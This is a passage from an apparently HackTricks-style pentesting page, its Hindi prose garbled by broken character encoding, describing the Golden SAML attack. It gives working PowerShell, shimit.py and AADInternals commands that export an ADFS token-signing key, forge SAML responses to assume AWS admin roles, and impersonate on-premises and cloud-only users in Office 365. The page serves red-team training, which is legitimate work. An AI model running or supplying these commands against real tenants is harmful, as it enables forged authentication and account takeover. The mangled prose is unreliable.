рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдЖрдк ADFS рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рд╣реИрдВ:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╡реИрдз SAMLResponse рднреВрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк [**shimit**](https://github.com/cyberark/shimit) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддрд┐рд░реВрдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### рдСрди-рдкреНрд░реЗрдо -> рдХреНрд▓рд╛рдЙрдб
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреЗрд╡рд▓ рдХреНрд▓рд╛рдЙрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ ImmutableID рдмрдирд╛рдпрд╛ рдЬрд╛рдП рдФрд░ рдЙрдирдХрд╛ рдкреНрд░рддрд┐рд░реВрдкрдг рдХрд┐рдпрд╛ рдЬрд╛рдПред
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## рд╕рдВрджрд░реНрдн

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рд╣рдореЗрдВ **Twitter** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
{% endhint %}
